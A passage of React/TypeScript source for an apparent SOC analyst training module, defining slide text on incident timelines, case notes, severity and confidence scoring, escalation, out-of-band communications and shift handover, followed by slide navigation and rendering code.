            'A defensible incident narrative relies on an airtight chronological timeline normalized to UTC: Event 1 (09:12:00 UTC Zeek DNS query to update-cdn-sync.com) -> Event 2 (09:12:15 UTC Sysmon Event 1 powershell.exe -enc script execution) -> Event 3 (09:12:45 UTC Active Directory Event 4624 lateral network logon to CDAC-BLR-DC01).',
          paragraph2:
            'Mentor Ananya notes: "Notice how three completely independent sensors—network TAP, host endpoint, and domain controller—tell one unified story when synchronized in UTC. Never use ambiguous local timestamps like \'this morning\' or \'10 minutes ago\'."',
          techBoxTitle: 'TECH BOX: ISO 8601 UTC Synchronization & Cross-Sensor Correlation',
          techBoxAnalogy:
            'Like synchronized surveillance cameras at a bank: when the vault door opens, camera 1 outside, camera 2 in the lobby, and camera 3 at the teller window all match down to the exact second.',
          techBoxDef:
            'UTC Chronology Timeline: The normalized chronological sequencing of security events across host, network, and directory logs using ISO 8601 Zulu timestamps to establish cause-and-effect.',
          techBoxWhy:
            'Eliminates timezone confusion during global SOC handoffs and provides courtroom-ready proof of adversary dwell time and lateral movement velocity.',
          defaultAnimation: 'm14-utc-chronology-timeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tml-zeek-beacon', label: '1. 09:12:00 ZEEK DNS' },
            { id: 'tml-sysmon-proc', label: '2. 09:12:15 SYSMON 1' },
            { id: 'tml-ad-auth', label: '3. 09:12:45 AD 4624' },
            { id: 'tml-l1-timestamp-rule', label: '4. UTC NORMALIZER' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: THE 5 WS OF CASE NOTES',
          subPillar: 'WHO, WHAT, WHEN, WHERE, WHY (EVIDENCE-BASED)',
          heading: 'Writing Professional, Actionable Incident Notes',
          paragraph1:
            'A case ticket without the 5 Ws is useless noise. Case #2026-881 demonstrates the professional standard: Who (User b_sharma, SID S-1-5-21... standard privileges), What (powershell.exe -enc payload, SHA-256 e3b0c44...), When (2026-10-15T09:12:15Z, duration 47s), Where (CDAC-BLR-WS-12, 10.0.4.21, VLAN 40), and Why (T1059.001 C2 staging).',
          paragraph2:
            'Ananya teaches Priya: "When Meera opens your ticket, she should not have to ask you a single basic question. All five dimensions must be answered cleanly with log proof attached to the ticket."',
          techBoxTitle: 'TECH BOX: The 5 Ws Documentation Framework',
          techBoxAnalogy:
            'Like an NTSB aircraft investigation log: Who (pilot in command & tail number), What (flight control input), When (cockpit voice recorder UTC), Where (radar coordinates), Why (mechanical sensor telemetry).',
          techBoxDef:
            'The 5 Ws Framework: The mandatory operational documentation standard capturing Identity (Who), Execution (What), Chronology (When), Topology (Where), and Objective (Why) in every case docket.',
          techBoxWhy:
            'Accelerates incident escalation by 70%, eliminating repetitive clarification queries between L1, L2, and management.',
          defaultAnimation: 'm14-five-ws-case-notes' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'not-who-entity', label: '1. WHO (IDENTITY)' },
            { id: 'not-what-binary', label: '2. WHAT (PROCESS)' },
            { id: 'not-when-timeline', label: '3. WHEN (UTC WINDOW)' },
            { id: 'not-where-asset', label: '4. WHERE (ASSET/IP)' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FACTS VS INFERENCES',
          subPillar: 'OBSERVED LOG PROOF VS LABELED HYPOTHESES',
          heading: 'The Balance Scale: Grounded Logs vs Speculative Leaps',
          paragraph1:
            'Professional security analysis requires absolute intellectual honesty. Section A records Observed Facts (verifiable logs, timestamps, hashes). Section B records Working Hypotheses (tentative operational theories explicitly labeled as unproven leads). Wild, unsubstantiated attribution claims are strictly forbidden.',
          paragraph2:
            'Meera reviews Priya\'s docket: "Saying \'powershell.exe executed with an encoded argument\' is an observed fact. Saying \'the script is a downloader staging malware\' is a working hypothesis. Saying \'APT29 has stolen our secrets\' is unproven fiction. Know the difference."',
          techBoxTitle: 'TECH BOX: Evidentiary Partitioning in Incident Records',
          techBoxAnalogy:
            'Like a detective\'s investigative file: forensic DNA and ballistics are filed under physical evidence; witness rumors and investigative leads are filed under active theories awaiting proof.',
          techBoxDef:
            'Fact vs Inference Demarcation: The analytical discipline of strictly separating cryptographically verified log data from tentative operational hypotheses in case dockets.',
          techBoxWhy:
            'Prevents cognitive bias and stops executive leadership from making disastrous strategic decisions based on unverified analyst hunches.',
          defaultAnimation: 'm14-facts-vs-inferences' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fvi-verified-fact', label: '1. OBSERVED FACT' },
            { id: 'fvi-speculative-leap', label: '2. UNPROVEN LEAP' },
            { id: 'fvi-labeled-hypothesis', label: '3. LABELED HYPOTHESIS' },
            { id: 'fvi-meera-standard', label: '4. MEERA DOCTRINE' },
          ],
        },
      ];
    }

    // Chapter 4: Severity, confidence and disposition
    if (chId === 'M14-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SEVERITY MATRIX SCORING',
          subPillar: 'SEV 1 - 4 CALIBRATION & LIVE SLA COUNTDOWNS',
          heading: 'Calibrating Incident Severity: Impact Scope × Asset Criticality',
          paragraph1:
            'Severity scoring dictates operational velocity and escalation paths: SEV-1 (Critical: Domain Controller compromise / ransomware outbreak, 15m SLA), SEV-2 (High: Workstation credential dumping / C2 beacon, 30m SLA), SEV-3 (Medium: Isolated LOLBin probe, 2h SLA), and SEV-4 (Low: Policy probe / benign scan, 8h SLA).',
          paragraph2:
            'Ananya emphasizes: "Severity is not based on how scared you feel; it is based on objective asset criticality and verified threat impact. Case #2026-881 is a SEV-2 because an active credential harvesting tool was observed on an engineering workstation."',
          techBoxTitle: 'TECH BOX: Severity Scoring Rubric & SLA Clocks',
          techBoxAnalogy:
            'Like hospital triage tags: Red (immediate resuscitation), Yellow (urgent surgical attention), Green (minor injuries treated within hours), Black (catastrophic beyond immediate field intervention).',
          techBoxDef:
            'Severity Matrix Scoring: An objective scoring model evaluating asset business criticality against observed adversary impact to assign standardized severity ratings (SEV 1-4) and enforcement SLAs.',
          techBoxWhy:
            'Ensures SOC resources are directed toward existential organizational threats rather than being consumed by low-priority informational alerts.',
          defaultAnimation: 'm14-severity-matrix-scoring' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sev-critical-sev1', label: '1. SEV-1 (CRITICAL)' },
            { id: 'sev-high-sev2', label: '2. SEV-2 (HIGH)' },
            { id: 'sev-medium-sev3', label: '3. SEV-3 (MEDIUM)' },
            { id: 'sev-low-sev4', label: '4. SEV-4 (LOW)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CONFIDENCE SCORING RUBRIC',
          subPillar: 'TELEMETRY CORROBORATION VS SINGLE-SOURCE ALARMS',
          heading: 'The Multi-Sensor Confidence Gauge: From 30% to 95%',
          paragraph1:
            'Confidence reflects the evidentiary certainty supporting an alert. A single uncorroborated IDS packet alert carries only 30% confidence (high false alarm rate). Corroborating it with Zeek flow telemetry elevates confidence to 65%. Adding Sysmon process execution and AD logon logs achieves 95% High Confidence.',
          paragraph2:
            'Meera warns: "Never order disruptive containment on a 30% single-packet alert! Hunt for the second and third corroborating sensors. When host, network, and directory agree, you strike with decisive confidence."',
          techBoxTitle: 'TECH BOX: Multi-Source Corroboration & Confidence Scaling',
          techBoxAnalogy:
            'Like a radar tracking station: a single blip could be weather clutter; two blips confirm a moving object; three blips with transponder telemetry confirm an inbound commercial airliner.',
          techBoxDef:
            'Confidence Scoring Rubric: The systematic measurement of analytical certainty based on independent multi-sensor corroboration (host process + network flow + identity directory).',
          techBoxWhy:
            'Prevents premature, panic-induced host quarantines while empowering responders to take decisive containment action when high confidence is proven.',
          defaultAnimation: 'm14-confidence-scoring-rubric' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cnf-single-source', label: '1. SINGLE SOURCE (30%)' },
            { id: 'cnf-dual-sensor', label: '2. DUAL SENSOR (65%)' },
            { id: 'cnf-multi-corroborated', label: '3. CORROBORATED (95%)' },
            { id: 'cnf-confidence-seal', label: '4. CONFIDENCE SEAL' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: CASE DISPOSITIONS',
          subPillar: 'THE 4 DISPOSITIONS: TP MALICIOUS, TP BENIGN, FP, UNKNOWN',
          heading: 'Closing the Loop: Mandatory Triage Dispositions',
          paragraph1:
            'Every ticket investigated by an L1 analyst must conclude with one of four formal dispositions: True Positive Malicious (confirmed threat requiring containment), True Positive Benign (accurate detection of authorized IT maintenance), False Positive (defective detection query), or Ambiguous/Inconclusive (insufficient logs).',
          paragraph2:
            'Ananya teaches: "Case #2026-881 is closed as True Positive Malicious. If Rajesh was running a scheduled patch, it would be True Positive Benign with change ticket CR-2026-904 attached. Every disposition requires an evidence explanation."',
          techBoxTitle: 'TECH BOX: Standardized Case Dispositions & Feedback Loops',
          techBoxAnalogy:
            'Like a judicial court ruling: Guilty (True Positive Malicious), Exonerated on Justified Grounds (True Positive Benign), Case Dismissed for Flawed Indictment (False Positive), or Mistrial Due to Missing Evidence (Inconclusive).',
          techBoxDef:
            'Case Dispositions: The standardized categorization applied to closed security tickets reflecting whether the alert detected genuine malice, authorized activity, rule noise, or inconclusive telemetry.',
          techBoxWhy:
            'Feeds continuous metric telemetry into SOC dashboards, driving detection tuning, analyst efficiency reviews, and organizational compliance audits.',
          defaultAnimation: 'm14-case-dispositions-quad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dsp-true-positive-mal', label: '1. TP MALICIOUS' },
            { id: 'dsp-true-positive-benign', label: '2. TP BENIGN (IT)' },
            { id: 'dsp-false-positive', label: '3. FALSE POSITIVE' },
            { id: 'dsp-ananya-disposition', label: '4. DISPOSITION RUBRIC' },
          ],
        },
      ];
    }

    // Chapter 5: Escalation path and ownership
    if (chId === 'M14-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ESCALATION CHAIN & ROLES',
          subPillar: 'OPERATIONAL HIERARCHY: PRIYA -> ANANYA -> MEERA -> CISO',
          heading: 'The Formal Incident Escalation Chain of Command',
          paragraph1:
            'In a security operations center, communication follows an unbreakable chain of command: Analyst Priya (L1 Triage & Scoping) -> Mentor Ananya (Shift Lead & Quality Gatekeeper) -> Mentor Meera (Incident Commander & Forensics Lead) -> IT Admin Rajesh (Infrastructure Support) -> CISO & Legal (Strategic Crisis Management).',
          paragraph2:
            'Ananya instructs: "A disciplined escalation chain ensures that senior incident commanders are not spammed with minor noise, while critical SEV-1 breaches reach executive leadership with zero communication friction."',
          techBoxTitle: 'TECH BOX: SOC Escalation Hierarchy & Role Definitions',
          techBoxAnalogy:
            'Like military command structure: frontline scouts identify the threat and alert the squad leader; the squad leader calls the field commander; the field commander directs tactical artillery.',
          techBoxDef:
            'Escalation Chain & Roles: The defined reporting path and operational authority matrix coordinating triage analysts, shift leads, forensic investigators, and executive stakeholders during an incident.',
          techBoxWhy:
            'Prevents chaotic, disorganized communication channels and ensures operational decisions are made by authorized personnel with appropriate technical context.',
          defaultAnimation: 'm14-escalation-chain-roles' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'esc-l1-triage', label: '1. L1 TRIAGE (PRIYA)' },
            { id: 'esc-shift-lead', label: '2. SHIFT LEAD (ANANYA)' },
            { id: 'esc-ir-lead', label: '3. IR LEAD (MEERA)' },
            { id: 'esc-ciso-mgmt', label: '4. CISO / LEGAL' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CASE OWNERSHIP TRANSFER',
          subPillar: 'THE POSITIVE ACKNOWLEDGEMENT (POSITIVE ACK) PROTOCOL',
          heading: 'Active Case Ownership Transfer & The Sacred Rule',
          paragraph1:
            'The most dangerous moment in an investigation is the handoff. Dropped tickets occur when an analyst reassigns a ticket in the ticketing tool and assumes someone else is watching it. Under the Positive Acknowledgement Protocol, a case handoff is only complete when the recipient explicitly accepts ownership.',
          paragraph2:
            'Meera teaches: "Priya delivers a 60-second verbal brief: \'Host WS-12, powershell encoded downloader, user b_sharma, Sysmon 1 attached.\' I click Accept Ownership in TheHive and confirm aloud: \'I have taken ownership.\' Until that click happens, Priya remains on duty."',
          techBoxTitle: 'TECH BOX: Positive Acknowledgment & Chain of Accountability',
          techBoxAnalogy:
            'Like handing over a surgical scalpel in an operating room: the scrub nurse places the blade in the surgeon\'s palm; the surgeon grasps the handle and announces "Scalpel in hand" before the nurse releases their grip.',
          techBoxDef:
            'Positive Acknowledgement (Positive Ack): The mandatory procedural protocol where case ownership remains with the sender until the recipient explicitly confirms receipt, verbalizes understanding, and accepts active responsibility.',
          techBoxWhy:
            'Eliminates dropped tickets and ambiguous responsibility gaps during shift changes and high-stakes operational escalations.',
          defaultAnimation: 'm14-case-ownership-transfer' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'own-ticket-staging', label: '1. TICKET STAGING' },
            { id: 'own-summary-briefing', label: '2. SUMMARY BRIEF' },
            { id: 'own-positive-ack', label: '3. POSITIVE ACK ✓' },
            { id: 'own-clear-ownership', label: '4. ACTIVE OWNER' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: OUT-OF-BAND COMMS',
          subPillar: 'THE STEALTH PROTOCOL & COMPROMISED INTERNAL NETWORKS',
          heading: 'Defending Against Internal Eavesdropping: The Out-of-Band Protocol',
          paragraph1:
            'When an adversary breaches a domain controller or executive workstation, they frequently monitor corporate Outlook email, Microsoft Teams, and Slack channels. Discussing containment plans on internal channels tips off the attacker, prompting immediate ransomware execution or wiping of log tracks.',
          paragraph2:
            'Ananya issues the directive: "On SEV-1 breaches or confirmed domain admin compromises, we invoke Out-of-Band Stealth Protocol immediately. We migrate to encrypted Signal bridges and dedicated out-of-band voice channels. We strike without the intruder knowing we are in the room."',
          techBoxTitle: 'TECH BOX: Out-of-Band Communication & OpSec Defenses',
          techBoxAnalogy:
            'Like a hostage rescue raid: police commanders do not broadcast the breach timing over open public walkie-talkies; they switch to encrypted tactical frequencies so the suspects cannot hear the countdown.',
          techBoxDef:
            'Out-of-Band Communications (OOB): The operational migration of incident response coordination away from corporate IT networks to independent, encrypted external channels to preserve tactical surprise and operational security.',
          techBoxWhy:
            'Prevents sophisticated adversaries with administrative domain access from monitoring containment planning and sabotaging response efforts.',
          defaultAnimation: 'm14-out-of-band-comms' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'oob-inband-danger', label: '1. IN-BAND LEAK ⚠️' },
            { id: 'oob-isolated-channel', label: '2. ENCRYPTED OOB' },
            { id: 'oob-protocol-rules', label: '3. OOB PROTOCOL' },
            { id: 'oob-ananya-guidance', label: '4. STEALTH CODES' },
          ],
        },
      ];
    }

    // Chapter 6: Shift handover and lessons learned
    if (chId === 'M14-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SHIFT HANDOVER BRIEFING',
          subPillar: 'THE 4-PART HANDOVER DOCKET: CASES, WATCHLIST, WINDOWS & SIGNOFF',
          heading: 'The Structured Shift Handover Operating Rhythm',
          paragraph1:
            'At the end of every 8-hour shift, the outgoing analyst delivers a structured 4-part Handover Briefing: 1. Active High-Priority Incidents (Case #2026-881 status), 2. Containment Watchlist (quarantined workstations being monitored for beaconing), 3. Authorized Change Windows (Rajesh\'s night patch deployment on VLAN 40), and 4. Formal Dual Shift Lead Signoff.',
          paragraph2:
            'Ananya explains: "Shift handover is where security operations either maintain seamless continuity or break down. A 10-minute disciplined briefing eliminates confusion and ensures the night shift protects the enterprise with full context."',
          techBoxTitle: 'TECH BOX: Shift Handover Docket & Queue Continuity',
          techBoxAnalogy:
            'Like air traffic controller shift handoffs: the outgoing controller briefs the incoming controller on every active aircraft on final approach, planes holding on taxiways, and runway maintenance closures.',
          techBoxDef:
            'Shift Handover Briefing: The formal synchronous transfer of operational situational awareness between outgoing and incoming SOC crews, covering active incidents, watchlists, scheduled changes, and queue metrics.',
          techBoxWhy:
            'Eliminates blindspots and operational friction during shift transitions, maintaining uninterrupted 24/7/365 enterprise defense.',
          defaultAnimation: 'm14-shift-handover-briefing' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'shf-active-cases', label: '1. ACTIVE TICKETS' },
            { id: 'shf-containment-watch', label: '2. CONTAINMENT WATCH' },
            { id: 'shf-maintenance-window', label: '3. CHANGE WINDOWS' },
            { id: 'shf-ananya-signoff', label: '4. SHIFT SIGNOFF ✓' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: POST-INCIDENT LESSONS',
          subPillar: 'BLAMELESS POST-MORTEMS & ENGINEERING FEEDBACK LOOPS',
          heading: 'Closing the Loop: Blameless Post-Mortems & Rule Engineering',
          paragraph1:
            'Phase 4 Post-Incident Activity transforms every security crisis into enduring defensive strength. A Blameless Post-Mortem follows a 4-step loop: 1. Identify Root Cause (spear-phishing macro attachment), 2. Close Detection Gaps (engineer Sigma rule T1059_PS_Obfuscation), 3. Optimize Playbooks (automate API token renewals), and 4. Cultivate Psychological Safety.',
          paragraph2:
            'Meera concludes: "We never ask \'Who made a mistake?\'; we ask \'Why did our security architecture permit this failure?\'. A blameless culture encourages analysts to report anomalies transparently, creating an unbreakable learning organization."',
          techBoxTitle: 'TECH BOX: Blameless Retrospective & Detection Engineering Feedback',
          techBoxAnalogy:
            'Like modern commercial aviation safety investigations: when an incident occurs, the focus is entirely on cockpit ergonomics, mechanical redundancy, and checklist clarity rather than punitive pilot punishment.',
          techBoxDef:
            'Blameless Post-Mortem: A collaborative engineering retrospective analyzing incident root causes, tooling blindspots, and procedural bottlenecks without punitive blame, driving continuous detection rule improvements.',
          techBoxWhy:
            'Fosters high-trust security team culture while converting observed threat actor tradecraft into permanent automated defenses.',
          defaultAnimation: 'm14-post-incident-lessons' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'lrn-root-cause', label: '1. ROOT CAUSE' },
            { id: 'lrn-detection-gap', label: '2. DETECTION GAP' },
            { id: 'lrn-playbook-update', label: '3. PLAYBOOK FIX' },
            { id: 'lrn-meera-postmortem', label: '4. BLAMELESS CULTURE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MASTER SOC CAPSTONE SIGNOFF',
          subPillar: 'THE DUAL SUPERVISORY SEAL OF MENTOR ANANYA & MENTOR MEERA',
          heading: 'The Ultimate Milestone: Master SOC Analyst Accreditation',
          paragraph1:
            'Graduation from the C-SOC program requires demonstrating proficiency across four foundational pillars: 1. Incident Response Lifecycle Mastery, 2. Forensic Volatile RAM Preservation, 3. Triage & Docket Precision (5 Ws and SEV calibration), and 4. Positive Acknowledgment Shift Handover Discipline.',
          paragraph2:
            'Mentors Ananya and Meera jointly award the Grand Master Supervisory Accreditation Seal: "Analyst Priya, you have proven that you possess the technical acumen, operational rigor, and calm discipline of an elite incident responder. You are ready to defend enterprise networks worldwide!"',
          techBoxTitle: 'TECH BOX: Master Capstone Matrix & C-SOC Certified Graduate',
          techBoxAnalogy:
            'Like receiving your gold naval flight wings: after surviving carrier landings, electronic warfare simulations, and supersonic formation flights, you are certified to fly live combat patrols.',
          techBoxDef:
            'Master SOC Capstone Sign-Off: The formal pedagogical certification recognizing comprehensive operational competence across all 14 modules of the Certified SOC Analyst curriculum.',
          techBoxWhy:
            'Certifies that graduates operate with elite professional rigor, ready to safeguard critical national infrastructure and global enterprise environments.',
          defaultAnimation: 'm14-master-soc-capstone-signoff' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mas-ir-lifecycle', label: '1. IR LIFECYCLE' },
            { id: 'mas-forensic-evidence', label: '2. FORENSIC EVIDENCE' },
            { id: 'mas-triage-disposition', label: '3. DISPOSITION ACCURACY' },
            { id: 'mas-dual-mentor-seal', label: '4. ANANYA & MEERA SEAL 🏆' },
          ],
        },
      ];
    }

    // Fallback for other modules
    return [
      {
        index: 0,
        pillarTag: 'PILLAR 01: ARCHITECTURE',
        subPillar: 'CORE CONCEPTS',
        heading: scaffolding?.concept ? `Who's in the SOC? (${scaffolding.concept})` : `Who's in the SOC?`,
        paragraph1:
          chapter.section1_theory.content.split('\n\n')[0] ||
          `A Security Operations Center functions as an elite coordinated unit. Technical escalations flow upward from L1 → L2 → L3.`,
        paragraph2:
          scaffolding?.analogy ||
          `As an L1 Analyst, you sit right in the center of the operational wheel. You review incoming alerts, collect host and user evidence, and document triage notes.`,
        techBoxTitle: `TECH BOX: Escalation Criteria & Triage [Details]`,
        techBoxAnalogy: scaffolding?.analogy || 'Like an emergency room triage nurse who checks vital signs before summoning senior trauma surgeons.',
        techBoxDef: scaffolding?.definition || 'L1 SOC Triage operates as the first-line inspection tier responsible for alert triage, scoping, and evidence preservation.',
        techBoxWhy: scaffolding?.whyItMatters || 'Prevents senior forensic analysts from being overwhelmed by benign false alarms.',
        defaultAnimation: (modId.includes('10') ? 'purdue-mesh' : 'team-orbit') as VisualStoryStyle,
        quickSwitchNodes: [
          { id: 'l1', label: 'L1' },
          { id: 'l2', label: 'L2' },
          { id: 'l3', label: 'L3' },
          { id: 'intel', label: 'INTEL' },
          { id: 'manager', label: 'MANAGER' },
        ],
      },
      {
        index: 1,
        pillarTag: 'PILLAR 02: TELEMETRY',
        subPillar: 'SENSOR CONDUIT',
        heading: `Continuous Ingestion & Telemetry Pipeline`,
        paragraph1:
          chapter.section1_theory.instructionalContext?.overview ||
          `Security telemetry begins with continuous event generation on workstations and servers.`,
        paragraph2:
          `Detection rules evaluate incoming signals in real time against known adversary techniques. When abnormal thresholds are exceeded, security alerts route to the L1 queue.`,
        techBoxTitle: `TECH BOX: Telemetry Pipeline & Thresholds [Details]`,
        techBoxAnalogy: 'Like an automated parcel conveyor belt equipped with optical scanners that flag damaged or hazardous packages.',
        techBoxDef: 'Telemetry Pipeline refers to the deterministic, buffered ingestion stream that moves raw host/network observables through parsers to analyst queues.',
        techBoxWhy: 'Ensures zero log loss during high-volume spikes, giving analysts complete audit trails for root-cause forensic timelines.',
        defaultAnimation: 'conduit-pipeline' as VisualStoryStyle,
        quickSwitchNodes: [
          { id: 'stage1', label: 'SOURCES' },
          { id: 'stage2', label: 'STREAM' },
          { id: 'stage3', label: 'RULES' },
          { id: 'stage4', label: 'ALERT ▲' },
          { id: 'stage5', label: 'YOU (L1)' },
        ],
      },
      {
        index: 2,
        pillarTag: 'PILLAR 03: DEFENSE',
        subPillar: 'TOOL ECOSYSTEM & BOUNDARY',
        heading: `SOC Tool Ecosystem & Incident Lifecycle`,
        paragraph1:
          chapter.section1_theory.instructionalContext?.doctrineNote
            ? `Analyst Doctrine: ${chapter.section1_theory.instructionalContext.doctrineNote}`
            : `Defending enterprise endpoints relies on defense-in-depth across cooperating sensor layers: EDR behavioral sensors, network packet taps, firewalls, and central SIEM dashboards.`,
        paragraph2:
          `Following standard incident lifecycles, analysts isolate infected endpoints from the local network and revoke compromised session tokens before adversaries move laterally.`,
        techBoxTitle: `TECH BOX: Sensor Defense & Containment Boundary [Details]`,
        techBoxAnalogy: 'Like bank security: guards at doors (Firewall), cameras in hallways (Zeek), motion sensors inside vaults (EDR), and the control room (SIEM).',
        techBoxDef: 'Layered Defense-in-Depth ensures that even if an adversary evades host detection, wire-level network taps catch their external C2 beaconing.',
        techBoxWhy: 'Enables rapid host isolation within minutes of initial compromise, completely preventing enterprise-wide ransomware spread.',
        defaultAnimation: (modId.includes('08') ? 'continuous-loop' : 'tool-ecosystem') as VisualStoryStyle,
        quickSwitchNodes: [
          { id: 'tool-endpoint', label: 'HOST' },
          { id: 'tool-siem', label: 'SIEM' },
          { id: 'tool-edr', label: 'EDR' },
          { id: 'tool-network', label: 'ZEEK' },
          { id: 'tool-firewall', label: 'NGFW' },
        ],
      },
    ];
  };

  const pillarScenarios = getPillarsForChapter();

  // Unified slide navigation handler
  const handleGoToSlide = (targetIdx: number) => {
    if (targetIdx < 0 || targetIdx >= pillarScenarios.length) return;
    sound.playClick();
    markPillarInteracted(targetIdx);
    setActiveTabIdx(targetIdx);

    // Broadcast change to floating nav bar and other listeners
    window.dispatchEvent(
      new CustomEvent('soc:slide-changed', {
        detail: {
          activeSlide: targetIdx,
          totalSlides: pillarScenarios.length,
          pillarTag: pillarScenarios[targetIdx]?.pillarTag,
          subPillar: pillarScenarios[targetIdx]?.subPillar,
          titles: pillarScenarios.map((p) => p.subPillar || p.pillarTag),
        },
      })
    );

    // Give DOM a tick to update before scrolling to active pillar
    setTimeout(() => {
      const el =
        document.getElementById(`pillar-box-${targetIdx}`) ||
        document.getElementById('section-interactive');
      if (el) {
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }, 50);
  };

  // Global event listeners for floating SectionSidebarLine and keyboard/navigation events
  useEffect(() => {
    const handleSetSlide = (e: any) => {
      const idx = e.detail?.index;
      if (typeof idx === 'number' && idx >= 0 && idx < pillarScenarios.length) {
        handleGoToSlide(idx);
      }
    };
    const handleNextSlideEvent = () => {
      if (activeTabIdx < pillarScenarios.length - 1) {
        handleGoToSlide(activeTabIdx + 1);
      }
    };
    const handlePrevSlideEvent = () => {
      if (activeTabIdx > 0) {
        handleGoToSlide(activeTabIdx - 1);
      }
    };
    const handleOpenKC = () => {
      setIsKCOpen(true);
      setTimeout(() => {
        const el = document.getElementById('section-kc') || document.querySelector('.knowledge-check-section');
        if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }, 50);
    };
    const handleOpenAdmin = () => {
      setIsEditorOpen(true);
    };
    const handleFinishChapterEvent = () => {
      handleFinishChapter();
    };

    window.addEventListener('soc:set-slide', handleSetSlide);
    window.addEventListener('soc:next-slide', handleNextSlideEvent);
    window.addEventListener('soc:prev-slide', handlePrevSlideEvent);
    window.addEventListener('soc:open-kc', handleOpenKC);
    window.addEventListener('soc:open-dev-admin', handleOpenAdmin);
    window.addEventListener('soc:finish-chapter', handleFinishChapterEvent);

    return () => {
      window.removeEventListener('soc:set-slide', handleSetSlide);
      window.removeEventListener('soc:next-slide', handleNextSlideEvent);
      window.removeEventListener('soc:prev-slide', handlePrevSlideEvent);
      window.removeEventListener('soc:open-kc', handleOpenKC);
      window.removeEventListener('soc:open-dev-admin', handleOpenAdmin);
      window.removeEventListener('soc:finish-chapter', handleFinishChapterEvent);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeTabIdx, pillarScenarios]);

  // Sync slide change to floating nav on activeTabIdx change or initial render
  useEffect(() => {
    window.dispatchEvent(
      new CustomEvent('soc:slide-changed', {
        detail: {
          activeSlide: activeTabIdx,
          totalSlides: pillarScenarios.length,
          pillarTag: pillarScenarios[activeTabIdx]?.pillarTag,
          subPillar: pillarScenarios[activeTabIdx]?.subPillar,
          titles: pillarScenarios.map((p) => p.subPillar || p.pillarTag),
        },
      })
    );
  }, [activeTabIdx, pillarScenarios]);

  // Render a Single Pillar Box matching Reference Screenshot Layout
  // Render a Single Pillar Box matching Reference Screenshot Layout
  const renderPillarBox = (p: typeof pillarScenarios[0]) => {
    const isTechOpen = openTechBoxes[p.index] || false;
    const selectedNode = selectedPillarNodes[p.index] || p.quickSwitchNodes[0].id;
    const currentPillarMode = pillarLayoutOverrides[p.index] || viewLayout;
    const isFocusedMode = currentPillarMode === 'focused';

    return (
      <section
        id={`pillar-box-${p.index}`}
        key={p.index}
        className="rounded-3xl p-5 sm:p-7 lg:p-8 bg-white dark:bg-[#070f26] border border-slate-200 dark:border-sky-500/30 text-slate-900 dark:text-slate-100 shadow-xl dark:shadow-2xl relative overflow-hidden w-full transition-all"
      >
        {/* Subtle top glow line */}
        <div className="absolute top-0 left-10 right-10 h-0.5 bg-gradient-to-r from-transparent via-sky-400/50 to-transparent pointer-events-none" />

        {isFocusedMode ? (
          /* ===================================================================
              FOCUSED GRAPHIC MODE (Explanation Pushed Upward at Same Size + Full Graphic Below)
          =================================================================== */
          <div className="space-y-6">
            {/* Top Explanation Block: Preserved Full Content & Same Readable Font Size */}
            <div className="space-y-4 pb-6 border-b border-slate-200 dark:border-slate-800/80 animate-fade-in">
              {/* Badges + Mode Toggle Button */}
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <div className="flex items-center gap-2 flex-wrap">
                  <Badge className="bg-sky-50 dark:bg-sky-500/15 text-sky-700 dark:text-sky-400 border border-sky-200 dark:border-sky-500/30 font-mono text-[10px] font-bold tracking-wider">
                    {p.pillarTag}
                  </Badge>
                  <span className="text-[10px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-wider">
                    {p.subPillar}
                  </span>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    sound.playClick();
                    setPillarLayoutOverrides((prev) => ({
                      ...prev,
                      [p.index]: 'split',
                    }));
                  }}
                  className="flex items-center gap-1.5 text-[10px] font-mono text-slate-600 dark:text-slate-400 hover:text-sky-600 dark:hover:text-sky-300 transition-colors px-2.5 py-1 rounded-lg border border-slate-200 dark:border-slate-700/80 bg-slate-100/90 dark:bg-slate-900/60 hover:border-sky-400 dark:hover:border-sky-500/40 cursor-pointer shadow-2xs"
                  title="Switch this pillar to side-by-side view"
                >
                  <Columns className="w-3.5 h-3.5 text-sky-500 dark:text-sky-400" />
                  <span>Switch to Split View</span>
                </button>
              </div>

              {/* Large Bold Heading */}
              <h2 className="pillar-heading font-extrabold text-slate-900 dark:text-white tracking-tight leading-snug">
                {p.heading}
              </h2>

              {/* Large Legible Explanation Paragraphs - Preserved Same Size */}
              <div className="story-text text-slate-700 dark:text-slate-300 space-y-3 leading-relaxed max-w-5xl">
                <p><GlossaryText text={p.paragraph1} /></p>
                <p><GlossaryText text={p.paragraph2} /></p>
              </div>

              {/* Collapsible Tech Box */}
              <div className="pt-1 max-w-5xl">
                <div className="rounded-xl border border-sky-200 dark:border-sky-500/30 bg-sky-50/70 dark:bg-[#081329] p-3.5 shadow-xs">
                  <div
                    onClick={() => {
                      sound.playClick();
                      setOpenTechBoxes((prev) => ({ ...prev, [p.index]: !isTechOpen }));
                    }}
